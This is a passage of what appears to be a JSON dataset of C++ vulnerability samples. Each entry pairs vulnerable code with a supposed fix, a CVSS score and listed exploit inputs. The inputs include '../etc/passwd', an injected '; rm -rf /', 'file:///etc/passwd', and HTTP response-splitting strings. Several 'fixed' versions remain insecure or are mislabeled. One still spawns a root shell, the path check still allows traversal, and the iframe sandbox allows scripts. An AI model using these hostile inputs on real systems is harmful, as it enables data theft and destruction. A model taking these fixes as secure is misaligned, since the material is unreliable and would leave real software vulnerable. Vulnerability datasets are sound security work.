        "vulnerability_code": "#include <unistd.h>\n\nint main() {\n    setuid(0);\n    system(\"/bin/sh\");\n    return 0;\n}",
        "cvss_score": 8.5,
        "fixed_code": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main() {\n    if (getuid() != 0) {\n        fprintf(stderr, \"This program must be run as root\\n\");\n        return 1;\n    }\n    system(\"/bin/sh\");\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could compile and execute the binary to gain a root shell.",
            "If part of a setuid program, an unprivileged user can run it to escalate privileges.",
            "Could be used as a payload in other exploits that require privileged access."
        ]
    },
    "c++_23": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "#include <iostream>\n#include <sstream>\n#include <boost/archive/text_iarchive.hpp>\n#include <boost/serialization/vector.hpp>\n\nclass VulnerableClass {\npublic:\n    std::vector<int> data;\n\nprivate:\n    friend class boost::serialization::access;\n    template<class Archive>\n    void serialize(Archive & ar, const unsigned int version) {\n        ar & data;\n    }\n};\n\nint main() {\n    std::string maliciousInput = \"22 serialization::archive 17 0 0 0 1 0 0 0\\n0 0 0 0 1 5 data 3 0 0 0 1 4 2 0 0 0\";\n    std::istringstream iss(maliciousInput);\n    boost::archive::text_iarchive ia(iss);\n    VulnerableClass vc;\n    ia >> vc;\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <sstream>\n#include <boost/archive/text_iarchive.hpp>\n#include <boost/serialization/vector.hpp>\n\nclass SecureClass {\npublic:\n    std::vector<int> data;\n\nprivate:\n    friend class boost::serialization::access;\n    template<class Archive>\n    void serialize(Archive & ar, const unsigned int version) {\n        ar & data;\n    }\n};\n\nint main() {\n    std::string trustedInput = \"22 serialization::archive 17 0 0 0 1 0 0 0\\n0 0 0 0 1 5 data 3 0 0 0 1 4 2 0 0 0\";\n    std::istringstream iss(trustedInput);\n    boost::archive::text_iarchive ia(iss);\n    SecureClass sc;\n    try {\n        ia >> sc;\n    } catch (const std::exception& e) {\n        std::cerr << \"Deserialization error: \" << e.what() << std::endl;\n        return 1;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can inject maliciously crafted input to perform code execution.",
            "Could use deserialization gadgets to manipulate program flow and gain unauthorized access.",
            "Crafted input could lead to denial of service by consuming excessive resources during deserialization."
        ]
    },
    "c++_24": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nint main() {\n    std::string filename;\n    std::cout << \"Enter file name to read: \";\n    std::cin >> filename;\n    std::ifstream file(filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << '\\n';\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\";\n    }\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nint main() {\n    const std::string base_path = \"/safe_directory/\";\n    std::string filename;\n    std::cout << \"Enter file name to read: \";\n    std::cin >> filename;\n    std::ifstream file(base_path + filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << '\\n';\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\";\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could input '../etc/passwd' to read the system's password file.",
            "They might try '../../var/log/auth.log' to access authentication logs and find sensitive information.",
            "Inputting '../private/key.pem' could lead to the exposure of private cryptographic keys."
        ]
    },
    "c++_25": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\n#include <thread>\n\nint shared_resource = 0;\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        int temp = shared_resource;\n        std::this_thread::yield();\n        shared_resource = temp + 1;\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Shared Resource: \" << shared_resource << std::endl;\n    return 0;\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\n#include <thread>\n#include <mutex>\n\nint shared_resource = 0;\nstd::mutex mtx;\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        std::lock_guard<std::mutex> lock(mtx);\n        int temp = shared_resource;\n        shared_resource = temp + 1;\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Shared Resource: \" << shared_resource << std::endl;\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent results in the shared resource value.",
            "By carefully timing thread execution, an attacker might force specific interleavings that lead to incorrect calculations or data corruption.",
            "If this pattern is used in a larger application managing critical resources, it could lead to unpredictable system behavior and potential security vulnerabilities."
        ]
    },
    "c++_26": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "void handleLogin(const std::string& username, const std::string& password) {\n    if (authenticate(username, password)) {\n        char sessionCookie[128];\n        generateSessionId(sessionCookie);\n        setcookie(\"sessionid\", sessionCookie, 3600);\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "void handleLogin(const std::string& username, const std::string& password) {\n    if (authenticate(username, password)) {\n        char sessionCookie[128];\n        generateSecureSessionId(sessionCookie);\n        setcookie(\"sessionid\", sessionCookie, 3600, \"/\", \"example.com\", true, true);\n    }\n}",
        "exploit_ways": [
            "An attacker can fixate a session ID and trick the victim into using it, gaining unauthorized access.",
            "By predicting or guessing session IDs, an attacker may hijack legitimate sessions if not properly secured.",
            "Session fixation can be combined with XSS to steal user sessions by injecting malicious scripts that set fixed session cookies."
        ]
    },
    "c++_27": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    std::cout << \"Hello, \" << userInput << \"!\\n\";\\n    return 0;\\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\\n#include <string>\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter your name: \";\\n    std::getline(std::cin, userInput);\\n    // Implement input validation and sanitization here\\n    if (userInput.find('<') != std::string::npos || userInput.find('>') != std::string::npos) {\\n        std::cout << \"Invalid input!\";\\n        return 1;\\n    }\\n    std::cout << \"Hello, \" << userInput << \"!\\n\";\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can inject HTML or JavaScript through the input to perform XSS attacks if this output is rendered in a web context.",
            "If the user input is not properly sanitized and logged, it could lead to log injection vulnerabilities.",
            "In certain contexts where the output is used in command-line operations, improperly sanitized inputs could lead to command injection."
        ]
    },
    "c++_28": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nvoid redirectUser(const std::string& url) {\\n    std::string command = \"xdg-open \\\"\" + url + \"\\\"\";\\n    system(command.c_str());\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL to visit: \";\\n    std::getline(std::cin, userInput);\\n    redirectUser(userInput);\\n    return 0;\\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <cstdlib>\\n\\nvoid redirectUser(const std::string& url) {\\n    const std::string allowedDomain = \"example.com\";\\n    if (url.find(allowedDomain) != std::string::npos) {\\n        std::string command = \"xdg-open \\\"\" + url + \"\\\"\";\\n        system(command.c_str());\\n    } else {\\n        std::cout << \"URL not allowed.\" << std::endl;\\n    }\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL to visit: \";\\n    std::getline(std::cin, userInput);\\n    redirectUser(userInput);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker could input a malicious URL like 'http://malicious.com' to redirect the user.",
            "They can inject additional commands using special characters like '; rm -rf /'.",
            "Crafting URLs that lead to phishing sites or malware downloads."
        ]
    },
    "c++_29": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\\nclass Button {\\npublic:\\n    void onClick() {\\n        std::cout << \"Button clicked!\" << std::endl;\\n    }\\n};\\nint main() {\\n    Button b;\\n    b.onClick(); // Simulated click event\\n}",
        "cvss_score": 2.1,
        "fixed_code": "#include <iostream>\\nclass Button {\\npublic:\\n    void onClick(bool isUserAction) {\\n        if (isUserAction) {\\n            std::cout << \"Button clicked!\" << std::endl;\\n        } else {\\n            std::cout << \"Invalid click event.\" << std::endl;\\n        }\\n    }\\n};\\nint main() {\\n    Button b;\\n    bool userAction = true; // This should be determined by actual user interaction\\n    b.onClick(userAction);\\n}",
        "exploit_ways": [
            "An attacker could simulate a click event programmatically to trigger actions without the user's intent.",
            "By manipulating the application state, an attacker might force the button to execute its action in unintended contexts.",
            "If integrated into a larger system, an attacker could exploit this vulnerability to perform unauthorized operations by faking user interactions."
        ]
    },
    "c++_30": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\nusing namespace std;\\n\\nint main() {\\n    string userInput;\\n    cout << \"Enter your name: \";\\n    getline(cin, userInput);\\n    cout << \"Hello, \" << userInput << \"! Welcome to our website.\\n\";\\n    return 0;\\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <algorithm>\\nusing namespace std;\\n\\nint main() {\\n    string userInput;\\n    cout << \"Enter your name: \";\\n    getline(cin, userInput);\\n    // Remove any linebreaks from the input to prevent HTTP response splitting\\n    userInput.erase(remove(userInput.begin(), userInput.end(), '\\n'), userInput.end());\\n    userInput.erase(remove(userInput.begin(), userInput.end(), '\\r'), userInput.end());\\n    cout << \"Hello, \" << userInput << \"! Welcome to our website.\\n\";\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker could input 'John\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<h1>Hacked</h1>' to inject additional HTTP headers.",
            "They could use '\\nSet-Cookie: EvilCookie=Hacked' to manipulate cookies sent to the client.",
            "An attacker might send '\\r\\nLocation: http://malicious.com' to redirect users to a malicious site."
        ]
    },
    "c++_31": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\n#include <string>\n#include <cstdlib>\n\nint main(int argc, char* argv[]) {\n    std::string url;\n    if (argc > 1) {\n        url = argv[1];\n        for (size_t i = 0; i < url.length(); ++i) {\n            if (url[i] == '&') {\n                std::string param = url.substr(i + 1);\n                if (param.find(\"redirect=\") == 0) {\n                    url = param.substr(9);\n                    break;\n                }\n            }\n        }\n    }\n    std::system((\"xdg-open \" + url).c_str());\n    return 0;\n}",
        "cvss_score": 7.5,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <cstdlib>\n\nbool is_safe_url(const std::string& url) {\n    const std::string allowed_prefix = \"https://example.com/\";\n    return url.find(allowed_prefix) == 0;\n}\n\nint main(int argc, char* argv[]) {\n    std::string url;\n    if (argc > 1) {\n        url = argv[1];\n        for (size_t i = 0; i < url.length(); ++i) {\n            if (url[i] == '&') {\n                std::string param = url.substr(i + 1);\n                if (param.find(\"redirect=\") == 0) {\n                    url = param.substr(9);\n                    break;\n                }\n            }\n        }\n    }\n    if (is_safe_url(url)) {\n        std::system((\"xdg-open \" + url).c_str());\n    } else {\n        std::cerr << \"Unsafe URL\" << std::endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.com' to redirect users.",
            "Using crafted parameters, e.g., '?redirect=http://phishingsite.com', can lead to phishing attacks.",
            "A URL with additional commands or flags could be used to execute unintended actions on the user's system."
        ]
    },
    "c++_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\n#include <thread>\nclass Counter {\npublic:\n    int count;\n    void increment() {\n        for (int i = 0; i < 1000; ++i) {\n            count++;\n        }\n    }\n};\nint main() {\n    Counter c;\n    std::thread t1(&Counter::increment, &c);\n    std::thread t2(&Counter::increment, &c);\n    t1.join();\n    t2.join();\n    std::cout << \"Count: \" << c.count << std::endl;\n    return 0;\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <iostream>\n#include <thread>\n#include <mutex>\nclass Counter {\npublic:\n    int count;\n    std::mutex mtx;\n    void increment() {\n        for (int i = 0; i < 1000; ++i) {\n            std::lock_guard<std::mutex> lock(mtx);\n            count++;\n        }\n    }\n};\nint main() {\n    Counter c;\n    std::thread t1(&Counter::increment, &c);\n    std::thread t2(&Counter::increment, &c);\n    t1.join();\n    t2.join();\n    std::cout << \"Count: \" << c.count << std::endl;\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could run the program multiple times to observe inconsistent count values due to race conditions.",
            "By introducing additional threads, an attacker might exacerbate the issue and cause the program to crash or behave unpredictably.",
            "Race conditions can lead to a denial of service by causing the system to hang or consume excessive resources."
        ]
    },
    "c++_33": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <unordered_map>\\n\\nstd::unordered_map<std::string, std::string> sessions;\\n\\nvoid login(const std::string& username) {\\n    static int session_counter = 0;\\n    std::string session_id = \"session_\" + std::to_string(session_counter++);\\n    sessions[session_id] = username;\\n    std::cout << \"Session ID: \" << session_id << std::endl;\\n}\\n\\nvoid access(const std::string& session_id) {\\n    if (sessions.find(session_id) != sessions.end()) {\\n        std::cout << \"Access granted for user: \" << sessions[session_id] << std::endl;\\n    } else {\\n        std::cout << \"Invalid session ID.\" << std::endl;\\n    }\\n}\\n\\nint main() {\\n    login(\"alice\");\\n    access(\"session_0\");\\n    return 0;\\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <unordered_map>\\n#include <random>\\n#include <ctime>\\n\\nstd::unordered_map<std::string, std::string> sessions;\\n\\nvoid login(const std::string& username) {\\n    std::mt19937 rng(static_cast<unsigned int>(std::time(nullptr)));\\n    std::uniform_int_distribution<int> dist(0, 99999);\\n    std::string session_id = \"session_\" + std::to_string(dist(rng));\\n    sessions[session_id] = username;\\n    std::cout << \"Session ID: \" << session_id << std::endl;\\n}\\n\\nvoid access(const std::string& session_id) {\\n    if (sessions.find(session_id) != sessions.end()) {\\n        std::cout << \"Access granted for user: \" << sessions[session_id] << std::endl;\\n    } else {\\n        std::cout << \"Invalid session ID.\" << std::endl;\\n    }\\n}\\n\\nint main() {\\n    login(\"alice\");\\n    access(\"session_0\");\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can predict or guess session IDs by observing the pattern of incrementing integers.",
            "By fixing a session ID value, an attacker might be able to hijack a legitimate user's session if they guess correctly.",
            "Using fixed session IDs allows attackers to set their own session cookies that could match existing ones."
        ]
    },
    "c++_34": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <iostream>\n#include <fstream>\n\nint main() {\n    std::ifstream file(\"secret.txt\");\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << '\\n';\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << '\\n';\n    }\n    return 0;\n}",
        "cvss_score": 2.5,
        "fixed_code": "#include <iostream>\n#include <fstream>\n\nint main() {\n    std::ifstream file(\"secret.txt\");\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            // Process the line without outputting it to standard output\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << '\\n';\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker with access to the program can run it to view sensitive information stored in secret.txt.",
            "If the file contains configuration details, an attacker could use this information to exploit other vulnerabilities.",
            "By guessing or knowing the filename, an attacker might extract additional files if similar code is used elsewhere."
        ]
    },
    "c++_35": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nvoid readFile(const std::string& filename) {\n    std::ifstream file(filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << std::endl;\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << std::endl;\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\n#include <fstream>\n#include <string>\n\nvoid readFile(const std::string& filename) {\n    const std::string allowed_path = \"./documents/\";\n    std::ifstream file(allowed_path + filename);\n    if (file.is_open()) {\n        std::string line;\n        while (getline(file, line)) {\n            std::cout << line << std::endl;\n        }\n        file.close();\n    } else {\n        std::cerr << \"Unable to open file\" << std::endl;\n    }\n}",
        "exploit_ways": [
            "An attacker can input \"/etc/passwd\" to read system's user list.",
            "They could specify a log file like \"/var/log/auth.log\" to extract login attempts and credentials.",
            "Inputting \"../../../../secrets.txt\" might allow access to sensitive information if the path isn't properly restricted."
        ]
    },
    "c++_36": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "#include <string>\\n#include <map>\\n\\nstd::map<std::string, std::string> sessions;\\n\\nbool authenticateUser(const std::string& username, const std::string& password) {\\n    if (username == \"admin\" && password == \"password123\") {\\n        std::string sessionID = generateSessionID(username);\\n        sessions[sessionID] = username;\\n        return true;\\n    }\\n    return false;\\n}\\n\\nstd::string generateSessionID(const std::string& username) {\\n    // Simulated session ID generation that is predictable or reusable.\\n    return \"fixedID\" + username.substr(0, 3);\\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <string>\\n#include <map>\\n#include <random>\\n#include <ctime>\\n\\nstd::map<std::string, std::string> sessions;\\nstd::mt19937 rng(static_cast<unsigned int>(std::time(nullptr)));\\n\\nbool authenticateUser(const std::string& username, const std::string& password) {\\n    if (username == \"admin\" && password == \"password123\") {\\n        std::string sessionID = generateSessionID();\\n        sessions[sessionID] = username;\\n        return true;\\n    }\\n    return false;\\n}\\n\\nstd::string generateSessionID() {\\n    // Generate a random and unpredictable session ID.\\n    std::uniform_int_distribution<> distr(0, 10000);\\n    return \"session_\" + std::to_string(distr(rng));\\n}",
        "exploit_ways": [
            "An attacker can predict the session ID using the username and hijack an admin's session.",
            "By knowing the predictable pattern, an attacker can create a session ID and force it on the user to take over their session.",
            "Session fixation could allow an attacker to lock into a specific session and maintain access across different login sessions."
        ]
    },
    "c++_37": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nvoid openRedirect(const std::string& url) {\n    std::cout << \"Redirecting to: \" << url << std::endl;\n}",
        "cvss_score": 6.5,
        "fixed_code": "#include <iostream>\n#include <string>\n\nbool isValidURL(const std::string& url) {\n    return (url.find(\"http://example.com\") == 0 || url.find(\"https://example.com\") == 0);\n}\n\nvoid openRedirect(const std::string& url) {\n    if (isValidURL(url)) {\n        std::cout << \"Redirecting to: \" << url << std::endl;\n    } else {\n        std::cout << \"Invalid URL\" << std::endl;\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a malicious URL like 'http://malicious.com' to redirect users.",
            "Could use the openRedirect function to perform phishing attacks by redirecting to fake login pages.",
            "Potentially exploit redirects to deliver malware or spread viruses through URLs crafted to deceive users."
        ]
    },
    "c++_38": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\n#include <thread>\n#include <atomic>\n\nstd::atomic<int> counter(0);\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        int local_counter = counter;\n        std::this_thread::sleep_for(std::chrono::nanoseconds(1));\n        counter = local_counter + 1;\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Counter value: \" << counter << std::endl;\n    return 0;\n}",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\n#include <thread>\n#include <atomic>\n\nstd::atomic<int> counter(0);\n\nvoid increment() {\n    for (int i = 0; i < 100000; ++i) {\n        int local_counter;\n        do {\n            local_counter = counter.load();\n        } while (!counter.compare_exchange_weak(local_counter, local_counter + 1));\n    }\n}\n\nint main() {\n    std::thread t1(increment);\n    std::thread t2(increment);\n\n    t1.join();\n    t2.join();\n\n    std::cout << \"Counter value: \" << counter << std::endl;\n    return 0;\n}",
        "exploit_ways": [
            "An attacker could cause the counter to have a lower final value than expected due to race conditions.",
            "If the counter is used for resource management, it might lead to undercounting and potential exhaustion of resources.",
            "In a larger system, such race conditions can lead to inconsistent states or crashes."
        ]
    },
    "c++_39": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "#include <iostream>\\n#include <thread>\\nclass SharedResource {\\nprivate:\\n    int data;\\npublic:\\n    SharedResource() : data(0) {}\\n\\n    void increment() {\\n        for (int i = 0; i < 1000; ++i) {\\n            int temp = data;\\n            std::this_thread::sleep_for(std::chrono::microseconds(1));\\n            data = temp + 1;\\n        }\\n    }\\n\\n    int getData() const { return data; }\\n};",
        "cvss_score": 4.3,
        "fixed_code": "#include <iostream>\\n#include <thread>\\n#include <mutex>\\nclass SharedResource {\\nprivate:\\n    int data;\\n    std::mutex mtx;\\npublic:\\n    SharedResource() : data(0) {}\\n\\n    void increment() {\\n        for (int i = 0; i < 1000; ++i) {\\n            std::lock_guard<std::mutex> lock(mtx);\\n            int temp = data;\\n            data = temp + 1;\\n        }\\n    }\\n\\n    int getData() const { return data; }\\n};",
        "exploit_ways": [
            "An attacker could run multiple threads to cause a race condition, leading to incorrect data values.",
            "By carefully timing the execution of threads, an attacker might manipulate the shared resource's state unexpectedly.",
            "The race condition can lead to inconsistent or corrupted data, affecting the integrity and reliability of the application."
        ]
    },
    "c++_40": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nvoid loadWebsite(const std::string& url) {\n    // Simulate loading a website in an iframe\n    cout << \"Loading website: \" << url << endl;\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter the URL to load: \";\n    std::getline(std::cin, userInput);\n    // Vulnerable due to lack of proper input validation and security checks\n    loadWebsite(userInput);\n    return 0;\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\n#include <string>\n#include <regex>\n\nbool isValidURL(const std::string& url) {\n    const std::regex pattern(R\"((http|https):\\/\\/(www\\.)?[a-zA-Z0-9@:%._\\+~#?&//=]{2,256}\\.[a-z]{2,6})\");\n    return std::regex_match(url, pattern);\n}\n\nvoid loadWebsite(const std::string& url) {\n    // Simulate loading a website in an iframe\n    cout << \"Loading website: \" << url << endl;\n}\n\nint main() {\n    std::string userInput;\n    std::cout << \"Enter the URL to load: \";\n    std::getline(std::cin, userInput);\n    if (isValidURL(userInput)) {\n        loadWebsite(userInput);\n    } else {\n        cout << \"Invalid URL\" << endl;\n    }\n    return 0;\n}",
        "exploit_ways": [
            "An attacker can input a malicious URL that redirects to a phishing site.",
            "Could provide a URL that leads to an exploit kit aiming to download malware.",
            "User could be redirected to a site that performs unwanted actions like logging keystrokes."
        ]
    },
    "c++_41": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\n#include <string>\n\nvoid displayOverlay() {\n    std::string html = \"<iframe src=\\\"https://malicious-site.com/overlay\\\"></iframe>\";\n    std::cout << html << std::endl;\n}",
        "cvss_score": 3.0,
        "fixed_code": "#include <iostream>\n#include <string>\n\nvoid displayOverlay() {\n    std::string html = \"<iframe src=\\\"https://malicious-site.com/overlay\\\" sandbox=\\\"allow-scripts allow-same-origin\\\"></iframe>\";\n    std::cout << html << std::endl;\n}",
        "exploit_ways": [
            "An attacker can overlay a transparent malicious iframe on top of the legitimate page to trick users into clicking.",
            "The user's clicks inside the iframe could be used to perform unauthorized actions on the malicious site.",
            "Attackers can host phishing content in the iframe to gather sensitive information from unsuspecting users."
        ]
    },
    "c++_42": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n#include <curl/curl.h>\\n\\nvoid fetchUrl(const std::string& url) {\\n    CURL* curl;\\n    CURLcode res;\\n    curl = curl_easy_init();\\n    if(curl) {\\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\\n        res = curl_easy_perform(curl);\\n        curl_easy_cleanup(curl);\\n    }\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL: \";\\n    std::cin >> userInput;\\n    fetchUrl(userInput);\\n    return 0;\\n}",
        "cvss_score": 5.3,
        "fixed_code": "#include <iostream>\\n#include <string>\\n#include <curl/curl.h>\\n\\nvoid fetchUrl(const std::string& url) {\\n    CURL* curl;\\n    CURLcode res;\\n    const std::string allowedHost = \"example.com\";\\n    if (url.find(allowedHost) != std::string::npos) {\\n        curl = curl_easy_init();\\n        if(curl) {\\n            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\\n            res = curl_easy_perform(curl);\\n            curl_easy_cleanup(curl);\\n        }\\n    } else {\\n        std::cerr << \"Access denied to URL: \" << url << std::endl;\\n    }\\n}\\n\\nint main() {\\n    std::string userInput;\\n    std::cout << \"Enter URL: \";\\n    std::cin >> userInput;\\n    fetchUrl(userInput);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can input 'http://internal.example.com/secrets' to access internal resources.",
            "They can try 'file:///etc/passwd' to read local files on the server.",
            "Attacker might use a crafted URL to perform port scanning within the same network."
        ]
    },
    "c++_43": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "#include <iostream>\\n#include <string>\\n\\nusing namespace std;\\nclass WebRedirect {\\npublic:\\n    void redirect(string url) {\\n        cout << \"Redirecting to: \" << url << endl;\\n    }\\n};",
        "cvss_score": 5.0,
        "fixed_code": "#include <iostream>\\n#include <string>\\nusing namespace std;\\nclass WebRedirect {\\npublic:\\n    void redirect(string url) {\\n        const string allowedDomain = \"example.com\";\\n        if (url.find(allowedDomain) != string::npos) {\\n            cout << \"Redirecting to: \" << url << endl;\\n        } else {\\n            cout << \"Invalid redirection URL.\" << endl;\\n        }\\n    }\\n};",
        "exploit_ways": [
            "An attacker could provide a malicious URL like 'http://malicious.com' to redirect users away from the intended site.",
            "By using URL parameters, an attacker can attempt to inject additional URLs that lead to phishing or malware sites.",
            "Crafting long URLs with multiple redirects might trick the application into forwarding users through several malicious sites before reaching a legitimate one."
        ]
    },
    "c++_44": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "#include <iostream>\\n#include <thread>\\nusing namespace std;\\nvoid createThreads() {\\n    while (true) {\\n        thread([]() {}).detach();\\n    }\\n}\\nint main() {\\n    createThreads();\\n    return 0;\\n}",
        "cvss_score": 4.2,
        "fixed_code": "#include <iostream>\\n#include <thread>\\nusing namespace std;\\nvoid createLimitedThreads(int max_threads) {\\n    for (int i = 0; i < max_threads; ++i) {\\n        thread([]() {}).detach();\\n    }\\n}\\nint main() {\\n    int max_threads = 100;\\n    createLimitedThreads(max_threads);\\n    return 0;\\n}",
        "exploit_ways": [
            "An attacker can run the program to exhaust system resources, causing a denial of service.",
            "By deploying multiple instances of this application, an attacker can overwhelm server resources.",
            "This vulnerability can be used in conjunction with other attacks to degrade system performance."
        ]
    },
    "c++_45": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\npublic:\n    void sendResponse(const std::string& content) {\n        std::cout << \"HTTP/1.1 200 OK\\r\\n\";\n        std::cout << \"Content-Length: \" << content.length() << \"\\r\\n\";\n        std::cout << \"\\r\\n\";\n        std::cout << content;\n    }\n};",
        "cvss_score": 5.3,
        "fixed_code": "class WebServer {\npublic:\n    void sendResponse(const std::string& content) {\n        std::cout << \"HTTP/1.1 200 OK\\r\\n\";\n        std::cout << \"Content-Length: \" << content.length() << \"\\r\\n\";\n        std::cout << \"X-XSS-Protection: 1; mode=block\\r\\n\";\n        std::cout << \"X-Content-Type-Options: nosniff\\r\\n\";\n        std::cout << \"Strict-Transport-Security: max-age=31536000; includeSubDomains\\r\\n\";\n        std::cout << \"Content-Security-Policy: default-src 'self'\\r\\n\";\n        std::cout << \"\\r\\n\";\n        std::cout << content;\n    }\n};",
        "exploit_ways": [
            "An attacker could inject malicious scripts into responses, leading to Cross-Site Scripting (XSS) attacks.",
            "Without Content Security Policy headers, attackers might load untrusted external resources that can exploit vulnerabilities in browsers or the application.",
            "Lack of X-Content-Type-Options header allows MIME-type sniffing, potentially enabling attackers to execute scripts uploaded as image files."
        ]
    },
    "c++_46": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "#include <iostream>\\n#include <fstream>\\n\\nvoid readSensitiveData() {\\n    std::ifstream file(\"sensitive_data.txt\");\\n    std::string line;\\n    while (getline(file, line)) {\\n        std::cout << line << std::endl;\\n    }\\n    file.close();\\n}",
        "cvss_score": 3.5,
        "fixed_code": "#include <iostream>\\n#include <fstream>\\n\\nvoid readSensitiveData() {\\n    std::ifstream file(\"sensitive_data.txt\");\\n    if (!file.is_open()) {\\n        std::cerr << \"Failed to open the file.\" << std::endl;\\n        return;\\n    }\\n    std::string line;\\n    while (getline(file, line)) {\\n        // Process data securely or restrict access\\n        std::cout << \"[REDACTED]\\\" << std::endl;\\n    }\\n    file.close();\\n}",
        "exploit_ways": [
            "An attacker with access to the application could view sensitive information printed to the console.",
            "If the application runs as a privileged user, an attacker could use this to gather system-level data.",
            "The presence of sensitive data in console output can be logged or captured by other processes on the same system."
        ]
    },
    "c++_47": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "#include <iostream>\\n\\nint main() {\\n    std::cout << \"Click the button to proceed...\" << std::endl;\\n    // Simulating a clickjacking scenario where the user clicks on an invisible malicious overlay\\n    std::string userInput;\\n    std::cin >> userInput;\\n    if (userInput == \"click\") {\\n        std::cout << \"You have been redirected to a malicious site.\" << std::endl;\\n    }\\n    return 0;\\n}",
